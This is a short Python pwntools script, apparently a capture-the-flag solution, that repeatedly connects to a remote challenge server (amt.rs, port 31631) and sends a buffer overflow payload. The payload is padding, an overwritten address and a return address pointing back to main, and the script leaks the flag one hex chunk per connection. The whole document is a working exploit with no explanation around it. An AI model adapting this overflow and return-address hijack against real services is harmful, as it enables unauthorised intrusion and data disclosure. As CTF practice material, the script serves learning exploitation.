from pwn import *


addr = 0xffffffc0
main_addr = 0x401186
s = ""

for i in range(64):
    p = remote("amt.rs", 31631)
    p.recvline()
    payload = b"a"*0x1c + p32(addr+i) + b"a"*8 + p64(main_addr)
    p.sendline(payload)
    s += p.recvline().strip().decode()

flag = bytes.fromhex(s)
print(flag.decode("ASCII"))

